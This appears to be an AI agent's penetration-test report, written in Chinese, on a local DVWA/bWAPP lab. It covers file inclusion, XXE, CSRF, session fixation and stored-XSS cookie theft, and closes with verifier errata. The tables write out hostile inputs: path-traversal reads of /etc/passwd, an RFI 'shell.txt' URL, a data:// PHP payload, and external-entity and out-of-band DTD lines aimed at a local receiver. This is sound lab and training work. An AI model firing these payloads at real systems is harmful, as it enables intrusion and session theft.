# Loop 3 · B 档挖掘报告：DVWA / bWAPP 补空白类别（t4）

- **任务**：t4「B 档挖掘：DVWA/bWAPP 补空白类别」
- **执行**：hunter-web；attempt_id `282f7ed9-5897-44cd-8323-047d317f6fa2`
- **窗口**：2026-10-12 21:51 – 22:25（Asia/Shanghai）
- **靶场**：Kali VM `dc1`（VirtualBox `kali-linux-2026.2-virtualbox-amd64`，NAT + host-only）
  - 宿主侧访问：`http://192.168.56.101/dvwa/`、`http://192.168.56.101/bWAPP/`（host-only 网段，仅宿主机可达）
  - VM 内访问：`http://127.0.0.1/dvwa/`、`http://127.0.0.1/bWAPP/`
  - 凭据：DVWA `admin/password`；bWAPP `bee/bug`
- **网络边界**：**全程零公网请求**。所有 HTTP 目标均为 127.0.0.1 / 192.168.56.101（host-only）或 VM 内回环。接收端仅绑 `127.0.0.1:8099`。
- **部署声明**：本任务**零部署、零下载**。DVWA 与 bWAPP 均为【原有】安装（t3 基线已证：目录 mtime Oct 8 19:29 / Oct 11 00:01）。

---

## 0. 三态结论速览

| 练习 | 三态 | 一句话结论 |
|---|---|---|
| **B1** 文件包含（LFI/RFI） | **成功** | DVWA low 下路径穿越读到 `/etc/passwd` 明文，`php://filter` base64 读到源码；RFI 明确**失败**（`allow_url_include=Off`） |
| **B2** XXE | **部分成功 / 关键否定** | bWAPP **原生** xxe 关卡存在，**内部实体可展开**（受控回显 5/5）；但 **`SYSTEM` 外部实体在本运行时未被展开**（low/medium/high 全空白），**未取得文件读取或数据外带的实证** → 不主张 Critical |
| **B3** 真实 CSRF token 约束 | **成功（含对照）** | 有 token（medium）无 token → `Invalid token!`（3/3 拦）；无 token（low）+ 跨站 Origin → **真实改库成功**（3/3，已复原）；真实浏览器 `<form>` 与顶级导航形态成功、`<img>` 形态失败 |
| **B4** 弱会话/会话固定 | **成功** | low 级攻击者自选 PHPSESSID **登录后原样保留**，陌生客户端仅带该 ID 即拿到已认证页（3/3）；weak_id low 档 `1..7` 完美自增 |
| **B5** 存储型 XSS 完整危害 | **成功** | 真实 Chromium 148 执行存储载荷 → **`PHPSESSID` 被外带** → 用被窃 ID **接管已认证会话**（3/3） |

**XXE 落点定性**：**bWAPP 原生关卡**（`/var/www/html/bWAPP/xxe-1.php` 与 `xxe-2.php`）。**不是自建靶点**。
另有**一个自建教学靶点**（`/var/www/html/lo3-teach/`）用于产出"禁用外部实体后的对照"，**已显式标注且不计入 bWAPP/DVWA 漏洞数**，测试后已删除并核验 404。

---

## 1. 阳性清单

| 编号 | 定性 | 品类 | 靶场/端点 | 危害 | 复现率（尝试/成功） | 笔记 |
|---|---|---|---|---|---|---|
| B1-LFI-01 | DVWA 原生漏洞复现 | path-traversal / LFI | DVWA low `/vulnerabilities/fi/?page=` | High | ≥95%（穿越 5/5、filter 5/5；负对照 3/3） | `security/learning/path-traversal/B1-LFI-01-DVWA文件包含路径穿越与phpfilter源码读取.md` |
| B2-XXE-01 | **bWAPP 原生关卡**（判定为"外部实体被运行时阻断"） | xxe（新增品类） | bWAPP `/bWAPP/xxe-2.php` | **Medium（未升级）** | 内部实体 ≥95%（5/5）；外部实体 low 3/3 + medium 3/3 **未展开**；OOB **0 命中** | `security/learning/xxe/B2-XXE-01-bWAPP原生XXE关卡实体展开与外部实体阻断.md` |
| B3-CSRF-01 | bWAPP 原生漏洞复现 | csrf（新增品类） | bWAPP low `/bWAPP/csrf_3.php` | Medium（同模式落改密即 High） | ≥95%（写入 3/3 + 复原 3/3；有 token 拦截 3/3；浏览器 2/3 形态） | `security/learning/csrf/B3-CSRF-01-bWAPP真实CSRF与token对照.md` |
| B4-SESSION-01 | DVWA 原生漏洞复现 | auth-bypass / 会话管理 | DVWA low `dvwa_start_session()` + `/vulnerabilities/weak_id/` | High | ≥95%（固定 3/3） | `security/learning/auth-bypass/B4-SESSION-01-DVWA会话固定与弱会话ID.md` |
| B5-XSS-01 | DVWA 原生漏洞复现 | xss（空目录已补） | DVWA low `/vulnerabilities/xss_s/` | High | ≥95%（完整链 3/3） | `security/learning/xss/B5-XSS-01-DVWA存储型XSS到会话劫持完整链.md` |

> **复现率口径**：均为区间表述（≥95%），基于本报告 §4 的逐条尝试次数/成功次数，**不写 100%**。失败轮次已在各笔记与 §5 逐个列明。

---

## 2. 阴性清单（本轮实测"没打出来"的，附方法与原始请求）

| 编号 | 项 | 测试方法 | 原始请求/响应要点 | 结论 |
|---|---|---|---|---|
| N-B01 | **RFI**（DVWA low `fi`） | `?page=http://127.0.0.1:8099/shell.txt`，接收端在跑，3 轮 | 3 轮全部 200、页面正常渲染、**接收端 0 命中**、无 `RFI` 字样回显 | **阴性**。`allow_url_include=Off`（`php -i` 实测）→ 远程包含不执行、运行时不发起外连。宿主侧 `sink_hits_total: 0` |
| N-B02 | **`data://` 包装器** | `?page=data://text/plain;base64,PD9waHAgZWNobyAnRFJBVEEtTE9PUDMtOTkwMCc7ID8+` | 200，页面正常，`executed: false` | **阴性**。同因 `allow_url_include=Off` |
| N-B03 | **bWAPP XXE 外部实体读文件** | `file:///etc/passwd` 打进 `<login>`（零写入形态：login 不存在） | low 3/3、medium 3/3 响应中**均无 `root:x:0:0`**；low 级实际返回 `An error occured!` | **阴性（外部实体）**。根因：PHP 8.4.24 + libxml 2.15.3 默认不展开 SYSTEM 实体，且 `xxe-2.php` 未传 `LIBXML_NOENT` |
| N-B04 | **bWAPP XXE 远程 DTD / OOB 外带** | `<!ENTITY % xxe SYSTEM "http://127.0.0.1:8099/xxe-*.dtd"> %xxe;` 三档各 1-3 轮 | **接收端 0 命中**（`oob_new: 0`），无任何 DTD 拉取请求 | **阴性**。连外部 DTD 都未被加载 |
| N-B05 | **bWAPP 实体放大（最小验证）** | 3 层 ×10 = 10⁴ 字节内部实体放进 `<secret>` | 200，正常响应 | 未测出可用影响；**仅测倍数、未做 DoS**（守则②非破坏性） |
| N-B06 | **SameSite 保护下的子资源 CSRF** | 从 `file://` 攻击页发起 `<img>` 请求到 `csrf_3.php` | 服务端收到的请求**不带 Cookie**（接收端 `cookie_sent: null`）→ 未认证 → 库值不变 | **阴性（该形态）**。失败在浏览器侧（子资源不带 Cookie），非服务端逻辑；同页换成顶级导航即成立 |

**阴性项为什么必须留**：N-B01/N-B02 与 B1 阳性是**同一端点**的两种利用路径（本地读 vs 远程包含），只报阳性会让人以为"该端点可 RCE"；N-B03/N-B04 与"bWAPP 有 XXE 关卡"看似矛盾，留证才能区分**"真没有"还是"没测到"**——本轮结论是**解析器层被默认配置挡住**，不是我没打。

---

## 3. 本轮未测声明（必须明示）

任务主题里的"6 个空白类别"指 `security/learning/` 下 6 个空目录。本轮**实际覆盖 4 类**（path-traversal、xss、auth-bypass 已补实证 + xxe/csrf 两个新增品类），**以下三类本轮未测、不得声称已补**：

| 空目录 | 状态 |
|---|---|
| `security/learning/idor/` | **本轮未测** |
| `security/learning/sql-injection/` | **本轮未测**（未对 DVWA/bWAPP 的 SQLi 关卡做任何注入测试） |
| `security/learning/ssti/` | **本轮未测** |
| `security/learning/command-injection/` | **本轮未测**（属"6 空目录"之一，本任务 5 条练习未含） |

> 说明：任务书写的是"6 个空白类别"，同时又说"本轮 B 档实际覆盖 path-traversal/xss/auth-bypass 与新增 XXE/CSRF 两类，不覆盖 idor/sql-injection/ssti"。本报告**以任务书为准**，并把同样未被 5 条练习覆盖的 `command-injection` 一并标为未测。

---

## 4. 复现率明细（尝试次数 / 成功次数）

数据源：`C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence\loop3-t4-probe13.json`（sha256 `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37`）

| 项 | 尝试 | 成功 | 区间 | 失败轮次 |
|---|---|---|---|---|
| B1 路径穿越读 `/etc/passwd` | 5 | 5 | ≥95% | 无 |
| B1 `php://filter` base64 读 | 5 | 5 | ≥95% | 无 |
| B1 负对照（不存在文件） | 3 | 3（正确地无内容） | ≥95% | 无 |
| B1 RFI（阴性） | 3 | 0（接收端 0 命中） | — | 3 轮均阴性（预期） |
| B2 内部实体展开（bWAPP 原生） | 5 | 5 | ≥95% | 无 |
| B2 外部实体（阴性） | low 3 / medium 3 | 0 / 0 | — | 6 轮均未展开 |
| B3 有 token 无 token（应拦） | 3 | 3（被拦） | ≥95% | 无 |
| B3 无 token 真实写入 + 复原 | 3 | 3 写 / 3 复原 | ≥95% | 无 |
| B4 会话固定（三个不同自选 ID） | 3 | 3 | ≥95% | 无 |
| B5 存储型 XSS → Cookie 外带 | 3 | 3 | ≥95% | 无 |
| B3 浏览器跨站形态 | 3（form / img / nav） | 2 | ≥66%（单轮样本小） | **第 2 轮 `<img>` 失败**（见 N-B06） |

---

## 5. 失败轮次与偏差（逐条）

| # | 失败/偏差 | 现象 | 根因（我方 / 靶场） | 处置 |
|---|---|---|---|---|
| F-01 | chromedriver 启动失败 | `NoSuchDriverException()` | **我方**：selenium 找不到驱动（PATH 未含 `/usr/bin`） | 显式 `ChromeService(executable_path="/usr/bin/chromedriver")` 后成功 |
| F-02 | bWAPP `<img>` 形态 CSRF 失败 | 库值不变 | **浏览器侧**：`file://` opaque origin 的子资源请求不带 Cookie（已用接收端实证） | 换顶级导航形态复现成功；失败轮次保留 |
| F-03 | probe2 中 medium/high 分支把 `bee.secret` 写成 `x` | 库值 `Any bugs?` → `x` | **我方预判错误**：该分支忽略 XML 的 `<login>`、改用 `$_SESSION["login"]`（=bee），所以我以为"login 不存在即零写入"的判断在中/高档不成立 | 立即经应用路径复原为 `Any bugs?`，并直查库确认；已在本报告与 B2 笔记如实记录 |
| F-04 | probe9 重复 F-03 | 库值再变 `x` | 同 F-03 | 同上复原；后续对照改用零写入形态 |
| F-05 | probe13 的 `db_secret:"x"` | 表面像"token 拦截失效" | 实为**上一步 B2 外部实体测试的残留**，非 CSRF 结论 | 追加 probe14 定性：medium 无 token 确实被拦、带 token 才生效 |
| F-06 | Python `%` 格式化吃掉 `%xxe;` | `TypeError: not enough arguments` | 我方脚本缺陷 | 改字符串拼接后重跑 |

---

## 6. 使用工具清单

| 工具 | 版本 | 用途 |
|---|---|---|
| Python | 3.12（宿主 `C:\Users\Administrator\AppData\Local\Programs\Python\Python312\python.exe`） | 编写全部探针脚本 |
| Python `requests` | 2.32.5（Kali 内） | HTTP 请求（会话、Cookie、原始响应） |
| Python `paramiko` | 由 `dsh-tools/kali-run.py`、`kali-put.py`、`kali-fetch-many-t4.py` 使用 | SSH/SFTP 到 Kali VM 执行与取证 |
| Selenium | 4.31.1（Kali 内） | 驱动真实浏览器验证 XSS 与跨站请求 |
| Chromium | 148.0.7778.178 | 真实浏览器（验证 `document.cookie` 外带） |
| ChromeDriver | 148.0.7778.178 | 与 Chromium 版本严格匹配 |
| PHP CLI | 8.4.24 (NTS)，libxml 2.15.3 | 解析器行为矩阵（`LIBXML_NOENT` 开/关对照） |
| Apache httpd | 2.4.68 (Debian) | 靶场 Web 服务 |
| MariaDB | 11.8.6-MariaDB | 数据库直查取证（`SELECT`/行数核对）与可回滚写入 |
| `curl` | 8.22.0（Kali 内） | 辅助请求与连通性验证 |
| VirtualBox `VBoxManage` | （宿主） | 仅 `list runningvms` 状态核查，未改任何 VM 配置 |

**未使用**：sqlmap（含任何自动化注入工具）、nmap、nuclei、ffuf、katana、Burp（本项目无 Burp）。**全程未用任何工具对写端点做布尔盲注。**

---

## 7. 硬约束符合性自述

| 约束 | 执行情况 |
|---|---|
| ① 仅本地靶场 | ✅ 全程 127.0.0.1 / 192.168.56.101(host-only) / VM 内；**零公网请求** |
| ② 非破坏性 | ✅ 未拖库、未写马、未改配置；唯一写入为 `bWAPP.users.secret`（队长批复的可回滚验证，已复原）与 guestbook 测试行（已按 name 精确删除）；RCE 类未触发 |
| ③ 限速 | ✅ 探针内置 `sleep(1.2s)`，串行执行，并发 1；未遇 429/503 |
| ④ 写端点先判 | ✅ bWAPP `csrf_3.php`/`xxe-2.php` 按队长批复先只读对照再真实变更；未对任何写端点用 sqlmap |
| ⑤ 不碰 8095 | ✅ 全程未访问 8095，未触碰 `/__reset` |
| ⑥ 账号状态变更先报 | ✅ 已报队长并获得批复（改 secret、会话观察），无改密/转账/复位 |
| ⑦ 证据规范 | ✅ 每条漏洞含原理+payload+原始证据+sha256+修复；阴性亦留证；复现率写区间并附失败轮次 |
| ⑧ 容器/VM | ✅ 未起容器；未改 VM 配置（仅读状态） |

**收尾状态核查**（`loop3-t4-probe15.json` / `loop3-t4-cleanup.sh`）：
- `/var/www/html/` 仅剩 `bWAPP`、`dvwa`、`index.html`、`index.nginx-debian.html` → **教学靶点已删除**
- `GET /lo3-teach/noent.php` → **404**
- `127.0.0.1:8099` → **已关闭**，无残留探针进程
- `/var/lib/php/sessions/` → **无任何 loop3 测试会话文件**
- `bWAPP.users`：`A.I.M.` / `bee`（`secret = Any bugs?` 出厂值，密码哈希未变）
- `dvwa.users`：5 行，密码哈希与初始一致
- `dvwa.guestbook`：**3 行**（与注入前一致；`comment_id=2,3` 的 `XSS_S_MARK_66` 属上一轮遗留，未删）
- `bWAPP.blog`：**0 行**
- `apache2` / `mariadb`：**active**（未改动服务状态）

---

## 8. 证据索引（完整文件名 + sha256）

| 文件（位于 `security/learning/_evidence/`） | 内容 | sha256 | 字节 |
|---|---|---|---|
| `loop3-t4-probe1.json` | 首测：LFI 命中、php://filter、负对照、bWAPP 登录 | `10508d7fd0da7a9ec43ffe6cb5a70fdf4cbf2ebf3daf2cfbf8a26b84b03fdb5e` | 3689 |
| `loop3-t4-probe2.json` | B2 决定性判定：内部实体展开 / file:// 空 / 未定义实体报错 | `ec21d03d66b844e4d8cee1032d56d5b3b240e1bf7206c7128095c7b85c738707` | 2136 |
| `loop3-t4-probe3.json` | `bee.secret` 复原（F-03 处置） | `3169954fd78e60c6468696f8bbcb4660b27a89d83b396c16d46c99b50ecd554d` | 494 |
| `loop3-t4-probe4.json` | 会话固定初测（impossible 对照）+ Cookie 属性 + weak_id | `62dd2a4e63f24d6b2cc0606e451e77165a4cbe08b2a3093461ff0eba71cbdebe` | 2552 |
| `loop3-t4-probe5.json` | B4 low 级决定性测试 + weak_id 四档序列 | `24eac0810fc4f9dd833f6e3779a069badb071377d6bc3e65fd213b6d9b3648cd` | 1911 |
| `loop3-t4-probe6.json` | B5 完整链（接收端起 + 存储 + 浏览器 + Cookie 外带） | `99b532fa648baf2ec466d901d526c22f45401f5e7cdc85d4fe18fd9390ac83f9` | 2677 |
| `loop3-t4-probe7.json` | 被窃 ID 劫持证明 + 负对照 + guestbook 清理核验 | `7a92dcc673326d16ac7d3a021cabc9e309af393d0e2d15a7522afae27b0d8c52` | 1399 |
| `loop3-t4-probe8.json` | B3 四段证据链 + 三种浏览器跨站形态 | `faeebbaad38701cd97c9c0f2867fff8279b791a186015e80b268da7cff387fbc` | 5821 |
| `loop3-t4-probe9.json` | B2 OOB（0 命中）+ SameSite 浏览器对照 + 版本 | `9bc4e52fef99c42a3a3a4779d99cb7d1dae488b86db0c5d08f10131459758ac3` | 3718 |
| `loop3-t4-probe10.json` | 复原复核 + 解析器相关 grep | `2d2a7cf8f6616702969843d376b7c9f8c3ce0f872a4b96b714ab3434e8b882a6` | 1764 |
| `loop3-t4-probe11.json` | 解析器矩阵 + 教学靶点部署/源码/删除核验 | `108924d1bc00972b39b6a09ddb4b7e31ab16998231b1706fc2902998a107afe6` | 4727 |
| `loop3-t4-probe12.json` | RFI/data:// 阴性 + 最终状态核查 | `edd5d3f50418c39f53ac8acd3684138684d4107124395a19ac280762c5da6a77` | 3134 |
| `loop3-t4-probe13.json` | **复现率总数** | `74aeab1389021ff6dc41ebc33b3456469ce49c0a07b03abf31dc2054be3a4d37` | 2876 |
| `loop3-t4-probe14.json` | B3 token 对照定性（F-05 澄清） | `7bf0cdb02ac09d7815b6b1d81b430a56701aa37001638492dcd0c037427365bf` | 1814 |
| `loop3-t4-probe15.json` | B5 四档分级对照 + 最终状态 | `5160ffd3b337d1de51b049ba18add0ead4186ed358d1658b0f33942b030de253` | 4075 |
| `loop3-t4-b5-sink.jsonl` | **B5 接收端原始请求记录**（含被窃 Cookie/UA/Referer） | `77f9c42b14294625764b83ff37aa65a7014a0b270494950a8f96cc8498838071` | 1427 |
| `loop3-t4-probe9-sink.jsonl` | SameSite 对照期间接收端记录 | `e79192488491278d08d06bb724a8631f3f0c164286eceba2c4edb3971548b18e` | 2450 |
| `loop3-t4-probe11-sink.jsonl` | 教学靶点远程 DTD 接收端记录 | `12fdb00bf5f802cade9643f040a16d01b68665a753dfaf6230481b8d47e5b3ad` | 158 |
| `loop3-t4-probe13-sink.jsonl` | 复现率三轮接收端记录 | `f7902c47d8d122fe305137b71db13f2a66e0f0a542b5e856cb1cc3db905b2c52` | 7197 |
| `loop3-t4-probe15-sink.jsonl` | 分级对照期间接收端记录 | `b8c956579fec1818dc1e81920d2cdc988cc914b78dee336babfec93be903f43d` | 2414 |
| `loop3-t4-b5-xss.png` | 真实 Chromium 渲染该页面的截图 | `ddfb4c791fca03362477e85da8fa966453e01d873b67d5978a91341bb280283c` | 95256 |
| `loop3-b0-recon3-out.txt` | DVWA `fi`/`csrf`/`weak_id`/`xss_s` 源码 | `b6617c10026ba2807d2af1ecd0071414bdccb898c7dfbe471e46bc0a3204aae6` | 9769 |
| `loop3-b0-recon4-out.txt` | bWAPP `xxe-1/2`、`csrf_1/2/3`、`cs_validation`、`rlfi` 源码 | `fc55d98a9d638c822e5d144972ccad88b8de8d52e02fa4c6f05418a768a6dad6` | 44893 |
| `loop3-b0-recon6-out.txt` | DVWA session 处理 + weak_id 源码 + 会话目录 | `af7aeabe5a74222faf11dab70292fd97ac012706b6ab05402b270555e5ce522b` | 8072 |
| `loop3-b0-recon7-out.txt` | `dvwa_start_session()` / `login.php` / weak_id 四档源码 | `120d9bd50b7169dc18d2919e979721de6ecc912339674345b9932aa09c4a74f9` | 10206 |
| `loop3-t4-cleanup.sh` / `loop3-t4-cleanup-out.txt` | 收尾清理脚本与核验输出 | `a85906310e6a0eb5ef4f7dd0052ca923b17cb3f6c36ac93c6dd7b7061a2b6693` / `ff11ee9a1ed9d34f82b68ec8cbdcb00d100ae7f4bf1fe8865cacdbd50bf3c66d` | 1887 / 3394 |

**可复跑脚本**（同目录，含 sha256）：
`loop3-t4-probe1.py` `5a73570a34016101fbc744d44e48b5d838c90ec8bb13d4e87a63b0ba719924ed`、
`loop3-t4-probe2.py` `34f4f2305bf3bc4ed0b3a09c6509b64454c2c7ca316cb214e45784caf01ea034`、
`loop3-t4-probe3.py` `1799a726eb5ee3c9209bf84b3126abfa4b846ca45baa3516fb0cbda1f18a878f`、
`loop3-t4-probe4.py` `2573430ded825ecfc919602ad877bcb21a40840bd1b3d20b4ad5b83fb779599a`、
`loop3-t4-probe5.py` `57c747da3884ff43889913664c901e4b7ad50f8d72978973a30560c4f481024d`、
`loop3-t4-probe6.py` `43a08d5fe037241a8cde6d3a63f2d1ad79869839050d4f23d950e13f5de55d2c`、
`loop3-t4-probe7.py` `ea7a1bda6deae18b502734121b05456ba8de846990fefb0c10cc4947f61b4b44`、
`loop3-t4-probe8.py` `59190e472b418035890e3c4e6cfaf3dc56c540ce539b75b69ac08b37394f4b85`、
`loop3-t4-probe9.py` `81e91dcd93fe12ab078e1d28d396b2adbbf33df68a5aa7aed3cc92a253330bd7`、
`loop3-t4-probe10.py` `202a06d8d69e46b5fcb1a11b6944ad83483ef86662282807527bfb8dca41fd81`、
`loop3-t4-probe11.py` `f3220efd1d57be2c5cd6e4b49237f904a4c1dc6a96c763d0402c4562dafb6f31`、
`loop3-t4-probe12.py` `24335ac0606afc48290a303479faef29ab3b0a325d7d9297af4e5e72e4f5015f`、
`loop3-t4-probe13.py` `127fb63b6ee5ed74adc7b826af294bf29cde87260c269cda544586bcc9dfe1ff`、
`loop3-t4-probe14.py` `0cdfc68c632dc5dc92cbb393bed4e5ce08576b6b0ed6c949487249ddb06a7454`、
`loop3-t4-probe15.py` `8382acd328bb0a2590e108c1a7b18fdd87d97cc28d7f171e99c95ddaaa8a9f0a`、
`loop3-b0-recon3.sh` `f8fc93be63021d4fa20843b2d748d3b07a67bfe86df188a7fb0686185092e573`、
`loop3-b0-recon4.sh` `58e5ebaba9f2e2ec27e3c667f97a22e6513655ccde1c8625a7181bc1f148da46`、
`loop3-b0-recon6.sh` `f0656f55b2f8db6e21e3089a4482d962e2c0cbac4063b8bd3387c93a4ff9c86f`、
`loop3-b0-recon7.sh` `d3695677a51d3c7a5a3467376b93fc88912ee871d64a241b7031f7d33a336de6`

---

## 9. 需要队长/verifier 决策的遗留项

1. **B2 的定性**：bWAPP 原生 xxe 关卡在本运行时**外部实体不可用**（PHP/libxml 默认行为导致）。建议定性为「**关卡存在但当前运行时阻断外部实体**（Medium/信息面）」，**不主张 High/Critical**。若队长要求"必须有外部实体实证"，唯一路径是自建带 `LIBXML_NOENT` 的靶点——但那属**教学构造**，按纪律不计入任何应用的漏洞数。
2. **DVWA 默认安全级别为 `impossible`**：本轮覆盖 low（及 B5 的四档对照）。是否要用 `medium`/`high` 全档复测 5 条练习（工作量约 2×）待定。
3. **bWAPP medium/high 写入语义差异**（F-03）：该分支忽略 XML 的 `<login>`、改用 `$_SESSION["login"]`，属**行为确认**，是否单列 info 条目由 verifier 判定。
4. **8095 未触碰**：确认无误；本轮所有动作都在 Kali VM 内。
5. **会话文件清理**：已删除本轮命名的测试会话；DVWA 会持续生成匿名会话文件（非破坏性，属正常现象）。

---

## 10. 与 Loop 1（自研靶场）的对照要点

| 维度 | Loop 1（target-site 8091/8095） | Loop 3 B 档（DVWA/bWAPP） |
|---|---|---|
| 应用类型 | 自研单文件 Python 靶场 | 成熟开源教学靶场（PHP + MySQL） |
| 防护 | 混合（部分已加固） | **按安全档位分级**（low/medium/high/impossible） |
| 本轮收获 | 业务逻辑/并发/CSRF/SESSION | **框架级真实约束**：CSRF token、`SameSite`、`session_regenerate_id`、libxml 解析器默认行为 |
| 关键教训 | "响应自报值不可信" | **"关卡存在 ≠ 可利用"**（B2）；**"档位不同结论相反"**（B4 在 impossible 级阴性、low 级阳性） |

---

## 11. 参考链接

- OWASP Top 10 2021：https://owasp.org/Top10/
- OWASP WSTG：https://owasp.org/www-project-web-security-testing-guide/
- PHP Session 配置：https://www.php.net/manual/en/session.configuration.php
- PHP libxml 常量（`LIBXML_NOENT`）：https://www.php.net/manual/en/libxml.constants.php
- DVWA 官方仓库：https://github.com/digininja/DVWA
- bWAPP 官方站点：http://www.itsecgames.com/

---

## 12. 勘误（2026-10-12 t11 追加，scribe）

> **本节是勘误，不是本报告的原始结论。**
> **§1–§11 全部保留原样未改** —— 那是 t4（hunter-web）当时的实测记录，改它就是篡改原始数据。
> 本节记录 verifier（t10）独立复核后确认的**两处结论修正**，以及 t5 补七节模板导致的**笔记 sha256 更新**。

### 12.1 结论修正一：B2-XXE-01 定级 Medium → **Low**

| 项 | 原报告（§1 L35） | **勘误后（以此为准）** |
|---|---|---|
| **危害等级** | **Medium（未升级）** | **Low（低危）** |
| 理由 | "外部实体被运行时阻断，未升级到 Critical" | **读文件 6/6 不可达、SSRF/OOB 6 次 0 命中 → CWE-611 核心危害实测为零、CVSS 影响项全 N** |

**定级为 Low 的唯一实测影响**：low 档 `display_errors` 回显 PHP Warning 连绝对路径（`/var/www/html/bWAPP/xxe-2.php on line 32`），属**错误信息泄露**。medium/high 档连这条都没有。

**决定性证据（服务端状态级，非响应体推测）**：verifier `verified-loop3-b-b2-rootcause-20261012-2236.json` → `low_cases[lowC4-SYSTEM-passwd]` 的 `secret_after` = **`"AABB"`** —— 外部实体被展开成**占位空串**，**不含任何文件内容**。这直接证明"实体确实被解析、但内容为空"，而非"解析中止"。

> **不得主张 High / Critical。** 详见 `security/learning/xxe/B2-XXE-01-bWAPP原生XXE关卡实体展开与外部实体阻断.md` §1.2。

### 12.2 结论修正二：B3-CSRF-01 的 `<img>` 归因须限定 `file://` 条件

| 项 | 原报告（§1 L36 复现率栏） | **勘误后（以此为准）** |
|---|---|---|
| 表述 | "浏览器 **2/3 形态**"（隐含 `<img>` 形态失败） | **`<img>` 形态在 `file://` 攻击页下失败；在真实跨源 `http://` 下 3/3 成功** |

**事实**：t4 首轮 `<img>` 失败的根因是**攻击页用了 `file://`**（opaque origin，跨源子资源不带 Cookie），**不是 `<img>` 形态本身的限制**。

**verifier 独立复现**：用真实跨源 `http://127.0.0.1:8098` 作攻击页发 `<img>` 子资源 → **3/3 成功**，`bee.secret` 被真实改写。证据 `verified-loop3-b-b3-browser-20261012-2236.json`。

> **口径**：**不得笼统写成"`<img>` 形态失败"** —— 那等于主动交出一个 reviewer 换个攻击页就能推翻的反驳点。详见 `security/learning/csrf/B3-CSRF-01-bWAPP真实CSRF与token对照.md` §4.1。

### 12.3 笔记 sha256 更新（因 t5 补七节模板而变更）

**背景**：t5（scribe）为统一七节模板修改了 B1–B5 五篇笔记，**t4 当时自报的 5 个 sha256 因此失效**（t4 汇报消息中的自报值，非本报告内的表 —— 本报告 §8 索引的是 `_evidence/` 原始证据文件，本次**零改动、hash 全部有效**）。

**最新值**（t11 独立重算，2026-10-12）：

| 笔记 | 最新 sha256 | 字节 | 本次是否改动 |
|---|---|---|---|
| `security/learning/path-traversal/B1-LFI-01-DVWA文件包含路径穿越与phpfilter源码读取.md` | `aaf09d0444a21690fe39b281f0769e4f2fef44e9567be56169e7925253531859` | 10261 | ❌ 未改动（t11 无修正项涉及） |
| `security/learning/xxe/B2-XXE-01-bWAPP原生XXE关卡实体展开与外部实体阻断.md` | `a5cb26776f9ef679db73fc73e693c3393b0a2a05c0e8af33fd0e57a77d0fb0a9` | 19183 | ✅ 定级修正 |
| `security/learning/csrf/B3-CSRF-01-bWAPP真实CSRF与token对照.md` | `06992d3df73b154af31c22101e252d3f6b28b570f403f2aeadad8ffadfcd864a` | 18903 | ✅ 归因修正 |
| `security/learning/auth-bypass/B4-SESSION-01-DVWA会话固定与弱会话ID.md` | `fbb98315b1d38a6144167c2548639786c3d931eca537e28c5aa0d0324667062a` | 17487 | ✅ cookie 坑 |
| `security/learning/xss/B5-XSS-01-DVWA存储型XSS到会话劫持完整链.md` | `df1b6e3d71fad2b4c830116f1ef7ad94591628041c88c6a91a284cd764b73137` | 16556 | ✅ cookie 坑 |

> **纪律**：改动已归档文件必须同步重算并报出新 hash，同时更新所有引用它的文档 —— 细则见 `security/learning/N-LOOP3-B-COVERAGE-B档分类覆盖声明.md` §5.3。

### 12.4 本次勘误未触及的范围

| 范围 | 状态 |
|---|---|
| §8 证据索引（25 行 `_evidence/` 原始证据） | **未改动，hash 逐条复核全部有效** |
| §1–§11 的原始结论与实测数据 | **未改动，按原样保留** |
| `verified-loop3-b-20261012-2236.json`（verifier 锁定产物） | **未触碰** |
| `loop3-kali-baseline-20261012-212122.json`（t3 锁定产物） | **未触碰**（其 mitm8080 条目状态见覆盖声明篇 §4.2 勘误） |
